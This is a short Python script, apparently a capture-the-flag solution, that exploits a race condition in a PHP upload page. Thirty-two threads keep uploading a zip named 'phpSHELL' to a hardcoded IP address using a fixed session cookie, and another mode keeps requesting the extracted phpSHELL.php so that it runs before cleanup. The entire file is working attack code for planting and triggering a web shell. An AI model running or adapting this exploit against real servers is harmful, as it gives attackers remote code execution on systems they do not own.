import requests
import sys
from multiprocessing.dummy import Pool as ThreadPool

cookie = {'PHPSESSID':'k35ps8bh97frfkk2uifjds45f6'}
url = "http://18.220.83.66/upload.php"
data = {'submit':'1'}

def runner1(i):
    while(1):
        files = {'file':open('phpSHELL.zip','rb')}
        req = requests.post(url,files=files,data=data,cookies=cookie)
        print req.status_code
def runner2(i):
    while(1):
        req = requests.get("http://18.220.83.66/uploads/2fb3af50907d42afff4192f8b0511819/phpSHELL.php")
        print req


if sys.argv[1] == '1':
    runner = runner1
else:
    runner = runner2

pool = ThreadPool(32)
result = pool.map_async( runner, range(32) ).get(0xffff)

